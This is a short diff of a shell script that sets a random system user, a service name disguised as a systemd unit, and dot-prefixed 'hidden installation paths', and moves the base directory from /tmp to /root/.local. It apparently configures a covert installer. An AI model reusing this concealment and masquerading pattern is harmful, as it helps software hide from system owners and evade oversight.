@@ -16,7 +16,7 @@ SYSTEM_USER="sys$(openssl rand -hex 8)"
 SERVICE_NAME="systemd-$(openssl rand -hex 6)"
 
 # Hidden installation paths
-BASE_DIR="/tmp/.$RANDOM_DIR"
+BASE_DIR="/root/.local/.$RANDOM_DIR"
 CONFIG_DIR="$BASE_DIR/.config"
 LOG_DIR="$BASE_DIR/.logs"
 CACHE_DIR="$BASE_DIR/.cache"
